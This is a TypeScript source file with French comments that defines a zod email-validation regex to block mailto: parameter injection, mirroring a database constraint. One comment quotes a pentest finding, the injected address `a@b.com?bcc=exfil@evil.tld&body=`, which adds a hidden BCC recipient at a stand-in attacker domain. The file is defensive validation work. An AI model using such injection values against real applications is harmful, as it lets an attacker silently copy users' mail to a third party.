import { z } from 'zod'

/*
 * Validation des adresses email, partagée par les features.
 *
 * MIROIR EXACT de la contrainte SQL `email_recipients_email_format`
 * (supabase/email_recipients_rls_hardening.sql). Les deux doivent évoluer
 * ensemble : la validation cliente est du confort, la contrainte en base est la
 * seule garantie non contournable (l'anon key permet d'appeler PostgREST
 * directement, sans passer par cet écran).
 *
 * POURQUOI CETTE REGEX plutôt que `z.email()` : on ne cherche pas la conformité
 * RFC 5322, on cherche à REJETER ce qui détourne une URL `mailto:`. Les
 * caractères exclus — ? & # ; , < > " et les espaces — sont exactement ceux qui
 * permettraient à une adresse stockée de réécrire les paramètres du mailto
 * construit dans lib/repjour/email.ts (pentest 2026-07-20, finding 5 :
 * `a@b.com?bcc=exfil@evil.tld&body=` ajoutait un destinataire caché).
 */
const EMAIL_RE = /^[^\s@;,?&#<>"]+@[^\s@;,?&#<>"]+\.[A-Za-z]{2,}$/

export const emailSchema = z
  .string()
  .trim()
  .regex(EMAIL_RE, 'Adresse email invalide')

/** Vrai si la valeur est une adresse exploitable sans risque dans un mailto. */
export function isValidEmail(value: string): boolean {
  return emailSchema.safeParse(value).success
}
